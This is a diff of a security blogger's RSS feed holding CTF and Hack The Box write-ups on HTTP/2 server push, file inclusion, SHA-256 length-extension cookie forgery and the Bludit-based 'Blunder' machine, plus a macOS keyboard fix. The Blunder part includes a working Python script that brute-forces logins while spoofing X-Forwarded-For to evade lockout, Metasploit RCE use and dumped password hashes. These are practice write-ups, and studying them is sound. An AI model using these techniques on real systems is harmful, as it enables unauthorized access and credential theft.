@@ -1,4 +1,31 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Inês Martins]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 4.3</generator><lastBuildDate>Tue, 25 May 2021 20:40:36 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Fixing keyboard type on macOS]]></title><description><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go</li></ul>]]></description><link>https://inesmartins.github.io//having-issues-with-your-keyboard-type-on-macos/</link><guid isPermaLink="false">609fdd03f0e974043bb7b5c0</guid><category><![CDATA[macOS]]></category><category><![CDATA[troubleshooting]]></category><category><![CDATA[keyboard type]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 15 May 2021 14:56:08 GMT</pubDate><content:encoded><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go to <code>/Library/Preferences</code> and see if you can find <code>com.apple.keyboardtype.plist</code></li></ul><pre><code>~ cd /Library/Preferences
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Inês Martins]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 4.3</generator><lastBuildDate>Fri, 28 May 2021 11:30:59 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC - HTTP2]]></title><description><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-84.png 600w, https://inesmartins.github.io//content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-85.png 600w, https://inesmartins.github.io//content/images/2021/05/image-85.png 788w" sizes="(min-width: 720px) 720px"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol,</p>]]></description><link>https://inesmartins.github.io//http3/</link><guid isPermaLink="false">60aa1e4ce1e20f0a69e2a808</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 28 May 2021 11:30:46 GMT</pubDate><content:encoded><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-84.png 600w, https://inesmartins.github.io//content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-85.png 600w, https://inesmartins.github.io//content/images/2021/05/image-85.png 788w" sizes="(min-width: 720px) 720px"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol, so it makes sense that this challenge is about some HTTP feature, either new or deprecated.</p><p>Using <code>curl</code> to fetch the page we see that it&apos;s served via <code>HTTP/2</code>, which is still kind of rare in the wild:</p><pre><code>~ curl -ik https://20.56.49.147/
+HTTP/2 200
+server: nginx/1.19.10
+date: Fri, 28 May 2021 11:27:17 GMT
+content-type: text/html
+content-length: 129
+last-modified: Thu, 20 May 2021 10:10:20 GMT
+etag: &quot;60a6358c-81&quot;
+accept-ranges: bytes
+
+&lt;img src=&quot;https://raw.githubusercontent.com/verhas/pushbuilder/master/http-versions.png&quot;&gt;
+&lt;!-- Lost? It&apos;s evolution, baby... --&gt;</code></pre><p><code>HTTP/2</code> supports the <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">Server Push</a> feature, which basically enables servers to send assets to the client without the client having to request them, which is the perfect setup for a hidden file, like the flag.</p><p>In order to log these &quot;hidden&quot; request, we can use <a href="chrome://net-export/">Chrome Net Export tool</a>:</p><ul><li>Open up a new Chrome tab and enter <code>chrome://net-export/</code>:</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-86.png" class="kg-image" alt loading="lazy" width="1167" height="415" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-86.png 600w, https://inesmartins.github.io//content/images/size/w1000/2021/05/image-86.png 1000w, https://inesmartins.github.io//content/images/2021/05/image-86.png 1167w" sizes="(min-width: 720px) 720px"></figure><ul><li>Click &quot;Start Logging to Disk&quot; and choose the file where you want to write on your computer;</li><li>Go to the challenge website and reload it;</li><li>Go back to the Chrome Net Export tool and click &quot;Stop Logging&quot;;</li><li>Click &quot;Show file&quot; to see the log file;</li><li>Search for the word <code>flag</code> among the results:</li></ul><pre><code>...
+{
+   &quot;params&quot;:{
+      &quot;headers&quot;:[
+         &quot;:method: GET&quot;,
+         &quot;:path: /flag_652f92e28feb20d2dc22874d54cefb9b0cf96ce5c65552161fdaad4a33776394.txt&quot;,
+         &quot;:scheme: https&quot;,
+         &quot;:authority: 20.56.49.147&quot;,
+         &quot;accept-encoding: gzip, deflate, br&quot;,
+         &quot;accept-language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7&quot;,
+         &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;
+      ],
+      &quot;id&quot;:1,&quot;promised_stream_id&quot;:2
+   },
+   ...
+},
+...</code></pre><ul><li>Access the resource and get the flag:</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-87.png" class="kg-image" alt loading="lazy" width="951" height="92" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-87.png 600w, https://inesmartins.github.io//content/images/2021/05/image-87.png 951w" sizes="(min-width: 720px) 720px"></figure><p>Note that alternatively, we could have simply used <a href="https://nghttp2.org/">Nghttp2</a>.</p>]]></content:encoded></item><item><title><![CDATA[Fixing keyboard type on macOS]]></title><description><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go</li></ul>]]></description><link>https://inesmartins.github.io//having-issues-with-your-keyboard-type-on-macos/</link><guid isPermaLink="false">609fdd03f0e974043bb7b5c0</guid><category><![CDATA[macOS]]></category><category><![CDATA[troubleshooting]]></category><category><![CDATA[keyboard type]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 15 May 2021 14:56:08 GMT</pubDate><content:encoded><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go to <code>/Library/Preferences</code> and see if you can find <code>com.apple.keyboardtype.plist</code></li></ul><pre><code>~ cd /Library/Preferences
 ~ ls | grep keyboard</code></pre><ul><li>Either remove it or move it somewhere else (if you want to have a backup)</li></ul><pre><code>~ sudo rm com.apple.keyboardtype.plist</code></pre><ul><li>Restart the computer</li><li>You&apos;ll be prompted to setup your keyboard again</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/1-1.png" class="kg-image" alt loading="lazy" width="700" height="510" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/1-1.png 600w, https://inesmartins.github.io//content/images/2021/05/1-1.png 700w"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/2.png" class="kg-image" alt loading="lazy" width="723" height="530" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/2.png 600w, https://inesmartins.github.io//content/images/2021/05/2.png 723w" sizes="(min-width: 720px) 720px"></figure><ul><li>Confirm your keyboard type and that&apos;s it</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/3.png" class="kg-image" alt loading="lazy" width="686" height="512" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/3.png 600w, https://inesmartins.github.io//content/images/2021/05/3.png 686w"></figure>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Don Joe [Crypto]]]></title><description><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p>]]></description><link>https://inesmartins.github.io//oposec-don-joe/</link><guid isPermaLink="false">6070c230e97e6981d27339e2</guid><category><![CDATA[crypto]]></category><category><![CDATA[cryptography]]></category><category><![CDATA[sha2]]></category><category><![CDATA[sha256]]></category><category><![CDATA[hashpump]]></category><category><![CDATA[hash_extender,]]></category><category><![CDATA[length extension attack]]></category><category><![CDATA[owasp zap]]></category><category><![CDATA[LFI]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 01 May 2021 09:38:18 GMT</pubDate><content:encoded><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-3.png" class="kg-image" alt loading="lazy"></figure><p>Clicking on the articles we can see that they&apos;re being fetched using the <code>id</code> query parameter:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-4.png" class="kg-image" alt loading="lazy"></figure><p>Luckily I didn&apos;t even have to do any tests, <a href="https://www.zaproxy.org/">OWASP Zap</a> immediately let me know how to exploit this <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">LFI vulnerability</a>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-5.png" class="kg-image" alt loading="lazy"></figure><p>So, let&apos;s see what we can find on <code>etc/passwd</code>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-6.png" class="kg-image" alt loading="lazy"></figure><p>One flag down!</p><hr><h2 id="m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</h2><p>When we go to the <a href="http://don-joes-blog.herokuapp.com/m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</a> directory we find the project&apos;s source code:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-7.png" class="kg-image" alt loading="lazy"></figure><p>As instructed, let&apos;s login as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-8.png" class="kg-image" alt loading="lazy"></figure><p>After logging in we see the same &quot;hidden&quot; home page, but now authenticated as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-9.png" class="kg-image" alt loading="lazy"></figure><p>The session is maintained using a cookie called <code>auth</code>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-10.png" class="kg-image" alt loading="lazy"></figure><p>When we base64-decode the cookie (<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)&amp;input=ZFhObGNtNWhiV1U5YzNWd2NtVnRaVjkxYzJWeU8zTmxZM0psZEQxaFpqTTFNV1kwTkRNeE16Qm1Nelk1WXpCalpHVTVPREl4TVRCaE1EZGlZamhtT0RneE1USmpZMlppTUdJNU1qTTJaV0ZqTVdVeVlUSXpZMkl3TlRReE93PT0">using CyberChef</a>) we see the authenticated user data plus some encrypted data, which should be some sort of checksum:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-1.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="analysing-the-source-code">Analysing the source code</h2><p>Looking at the source code we can see that there is a user DB (<code>users_db.py</code>) with 2 users, <code>supreme_user</code> and <code>admin</code>:</p><pre><code>{&quot;username&quot;: &quot;supreme_user&quot;, &quot;password&quot;: &quot;af351f443130f369c0cde982110a07bb8f88112ccfb0b9236eac1e2a23cb0541&quot;, &quot;role&quot;: 0},
 {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;2ae3a0f2ef89bf388e7cdc7f5fc9f1b60e5542d0a6c2f6f1cf88190d0ab2b711&quot;, &quot;role&quot;: 1}
 </code></pre><p>Searching for flag-related methods we see the <code>admin_flag()</code> function, which is triggered by navigating to the <code>admin</code> route. In short, if the user is authenticated as <code>admin</code> the application renders the final flag, else it displays the &quot;Forbidden&quot; route page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-11.png" class="kg-image" alt loading="lazy"></figure><p>The <code>is_admin</code> function:</p><ol><li>checks for a valid session;</li><li>checks that there&apos;s a user that matches the session;</li><li>prints some debug info;</li><li>returns <code>true</code> if the user role is <code>1</code>, which from what we can see is only true for the <code>admin</code> user.</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-12.png" class="kg-image" alt loading="lazy"></figure><p>The <code>get_session</code> function checks the <code>auth</code> cookie and then returns the parsed data:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-13.png" class="kg-image" alt loading="lazy"></figure><p>The <code>parse_session</code> function:</p><ol><li>splits the cookie into data and signature;</li><li><code>base64</code>-decodes both parts of the cookie;</li><li>checks that the data matches the signature;</li><li>returns all the fields on the decoded data as a dictionary.</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-14.png" class="kg-image" alt loading="lazy"></figure><p>Now for the signature checking, it seems like the data is appended to some random <code>SECRET</code> value and then hashed using <code>SHA-256</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-15.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-16.png" class="kg-image" alt loading="lazy"></figure><p>However, the <code>SECRET</code> is not easily brute-forceable since it contains between 8 and 15 random bytes:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-17.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="length-extension-attack">Length Extension Attack</h2><blockquote>TL;DR: given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix. [<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Source</a>]</blockquote><p>Knowing that this vulnerability affects <code>SHA-256</code>, we can create a script that:</p><ol><li>retrieves a valid <code>auth</code> cookie for the <code>supreme_user</code> by authenticating with the known credentials;</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-21.png" class="kg-image" alt loading="lazy"></figure><p>2. for all possible lengths of <code>SECRET</code>, uses <a href="https://github.com/iagox86/hash_extender">hash_extender</a> to create valid cookies with the admin authentication data (username and hashed password):</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/04/image-24.png" class="kg-image" alt loading="lazy"></figure><p>3. for each of the cookies, try to access the <code>admin</code> route and see if one of the cookies is a valid form of authentication:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-26.png" class="kg-image" alt loading="lazy"></figure><p>4. Putting it all together we get a hit!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-25.png" class="kg-image" alt loading="lazy"></figure><p><br></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Time]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb
@@ -1066,197 +1093,4 @@ END
 </code></pre>
 <!--kg-card-end: markdown--><p>Since we&apos;re root, we can print the root flag from its relative path to the mount point.</p><!--kg-card-begin: markdown--><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
 </code></pre>
-<!--kg-card-end: markdown--><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up  | Blunder]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
-Nmap scan report for blunder.htb (10.10.10.191)
-Host is</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-blunder/</link><guid isPermaLink="false">5ee346443d00be7291b53cc6</guid><category><![CDATA[htb]]></category><category><![CDATA[bludit]]></category><category><![CDATA[cms]]></category><category><![CDATA[cewl]]></category><category><![CDATA[apache]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:50:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/infocard.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/infocard.png" alt="HTB Write-up  | Blunder"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
-Nmap scan report for blunder.htb (10.10.10.191)
-Host is up (0.48s latency).
-Not shown: 998 filtered ports
-PORT   STATE  SERVICE VERSION
-21/tcp closed ftp
-80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-generator: Blunder
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Blunder | A blunder of interesting facts
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 100.87 seconds
-</code></pre>
-<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/">Home</a> and <a href="http://blunder.htb/about">About</a> pages are very simple, just a couple of posts that don&apos;t seem very relevant, but from the source code we can tell this blog was created using version 3.9.2. of the <a href="https://www.bludit.com/">Bludit CMS</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/home-1.png" class="kg-image" alt="HTB Write-up  | Blunder" loading="lazy"></figure><h3 id="checking-for-bludit-vulnerabilities">Checking for Bludit Vulnerabilities</h3><p>As with most Bludit-based applications, this one has an <a href="http://blunder.htb/admin/">admin page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/admin-1.png" class="kg-image" alt="HTB Write-up  | Blunder" loading="lazy"></figure><p>After checking for <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=17229&amp;product_id=41420&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=8&amp;sha=012a032fbb16ed1554a64233f60621639d4bf196">vulnerabilities</a> there is only 1 that matches this version and seems interesting:</p><blockquote><a href="https://www.cvedetails.com/cve/CVE-2019-16113/">CVE-2019-16113</a>: &quot;remote code execution via <a href="http://blunder.htb/bl-kernel/ajax/upload-images.php">bl-kernel/ajax/upload-images.php</a> because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.&quot;</blockquote><p>From the CVE Details page we also know there&apos;s a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> linked to this CVE, however, this module requires us to know user and pass.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
-
-msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show info
-...
-Description:
-  This module exploits a vulnerability in Bludit. A remote user could 
-  abuse the uuid parameter in the image upload feature in order to 
-  save a malicious payload anywhere onto the server, and then use a 
-  custom .htaccess file to bypass the file extension check to finally 
-  get remote code execution.
-</code></pre>
-<!--kg-card-end: markdown--><p>We don&apos;t know the credentials but according to <a href="https://github.com/bludit/bludit/issues/1026">this open Github issue</a>, we do know that the username is <code>admin</code><strong> </strong>by default, which means we might be able to brute-force the password.</p><h3 id="bypassing-brute-force-protection">Bypassing Brute Force Protection</h3><p>When I tried to brute-force the password using <a href="https://portswigger.net/burp">Burp</a>, only the first request seemed to be processed correctly, the following requests all returned <code>301</code>. </p><p>After a bit of Googling, I realised this is caused by Bludit&apos;s &quot;<a href="https://docs.bludit.com/en/security/brute-force-protection">Brute Force Protection</a>&quot; feature, that&apos;s present on all versions after 3.9.2. </p><p>Luckily, some more Googling produced a very useful <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">article</a> that tells us how to bypass this mechanism. Turns out, the application determines the user&apos;s IP by trusting the <code>X-Forwarded-For</code> and <code>Client-IP</code> HTTP headers. Once Bludit detects more than x failed authentication requests (this number is configurable), it starts rejecting the authentication requests.</p><p>Since there&apos;s no validation that the IP is valid, we can simply pass the password as the <code>X-Forwarded-For</code> param, and then we can try to brute-force the passwords:</p><pre><code class="language-python">#!/usr/bin/env python3
-import re
-import requests
-
-host = &apos;http://blunder.htb&apos;
-login_url = host + &apos;/admin/login&apos;
-username = &apos;admin&apos;
-pwd_file = &quot;wordlist.txt&quot;
-
-# read passwords from file and adds them to wordlist array
-wordlist = []
-file = open(pwd_file, &quot;r&quot;)
-for line in file: 
-    wordlist.append(line.strip())
-
-for password in wordlist:
-    session = requests.Session()
-    login_page = session.get(login_url)
-    csrf_token = re.search(&apos;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&apos;, login_page.text).group(1)
-
-    print(&apos;[*] Trying: {p}&apos;.format(p = password))
-
-    headers = {
-        &apos;X-Forwarded-For&apos;: password,
-        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&apos;,
-        &apos;Referer&apos;: login_url
-    }
-
-    data = {
-        &apos;tokenCSRF&apos;: csrf_token,
-        &apos;username&apos;: username,
-        &apos;password&apos;: password,
-        &apos;save&apos;: &apos;&apos;
-    }
-
-    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
-
-    if &apos;location&apos; in login_result.headers:
-        if &apos;/admin/dashboard&apos; in login_result.headers[&apos;location&apos;]:
-            print()
-            print(&apos;SUCCESS: Password found!&apos;)
-            print(&apos;Use {u}:{p} to login.&apos;.format(u = username, p = password))
-            print()
-            break</code></pre><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
-</code></pre>
-<!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><hr><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but I finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
-...
-000004125:   200        4 L      23 W     118 Ch      &quot;todo&quot;
-...
-</code></pre>
-<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/todo.txt">todo file</a> contains the following information:</p><!--kg-card-begin: markdown--><pre><code>-Update the CMS
--Turn off FTP - DONE
--Remove old users - DONE
--Inform fergus that the new blog needs images - PENDING
-</code></pre>
-<!--kg-card-end: markdown--><p>So, some interesting new information:</p><ul><li>there is an <code>FTP</code> service configured on this machine;</li><li>there is someone named <code>fergus</code> that might correspond to a user name;</li></ul><p>So, again we try to brute-force the password but now for the user <code>fergus</code>.</p><!--kg-card-begin: markdown--><pre><code>$ python3 bludit-bruteforce.py
-...
-SUCCESS: Password found!
-Use fergus:RolandDeschain to login.
-</code></pre>
-<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>Now that we have valid credentials for <code>fergus</code>, we can test the <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> we found previously. After changing the payload, we&apos;re in!</p><pre><code>meterpreter &gt; getuid
-Server username: www-data (33)
-
-meterpreter &gt; sysinfo
-Computer    : blunder
-OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
-Meterpreter : php/linux</code></pre><p>Now that we have access to the blog&apos;s source files, we can read the <code>users.php</code> database:</p><pre><code>&gt; cat databases/users.php
-
-&lt;?php defined(&apos;BLUDIT&apos;) or die(&apos;Bludit CMS.&apos;); ?&gt;
-{
-    &quot;admin&quot;: {
-        &quot;nickname&quot;: &quot;Admin&quot;,
-        &quot;firstName&quot;: &quot;Administrator&quot;,
-        &quot;lastName&quot;: &quot;&quot;,
-        &quot;role&quot;: &quot;admin&quot;,
-        &quot;password&quot;: &quot;bfcc887f62e36ea019e3295aafb8a3885966e265&quot;,
-        &quot;salt&quot;: &quot;5dde2887e7aca&quot;,
-        &quot;email&quot;: &quot;&quot;,
-        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
-        &quot;tokenRemember&quot;: &quot;&quot;,
-        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
-        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
-        ...
-    },
-    &quot;fergus&quot;: {
-        &quot;firstName&quot;: &quot;&amp;quot; or 1=1 #&quot;,
-        &quot;lastName&quot;: &quot;&amp;quot; or 1=1 #&quot;,
-        &quot;nickname&quot;: &quot;&amp;quot; or 1=1 #&quot;,
-        &quot;description&quot;: &quot;&quot;,
-        &quot;role&quot;: &quot;author&quot;,
-        &quot;password&quot;: &quot;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&quot;,
-        &quot;salt&quot;: &quot;jqxpjfnv&quot;,
-        &quot;email&quot;: &quot;&amp;quot; or 1=1 #&quot;,
-        &quot;registered&quot;: &quot;2019-11-27 13:26:44&quot;,
-        &quot;tokenRemember&quot;: &quot;73a6fca50fe0ad2edb1390e0a1bfb8b5&quot;,
-        &quot;tokenAuth&quot;: &quot;0e8011811356c0c5bd2211cba8c50471&quot;,
-        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
-        ...
-    }
-}</code></pre><p>There is also a folder for another version of the application, which contains a different version of the <code>users.php</code> database:</p><pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
-&lt;?php defined(&apos;BLUDIT&apos;) or die(&apos;Bludit CMS.&apos;); ?&gt;
-{
-    &quot;admin&quot;: {
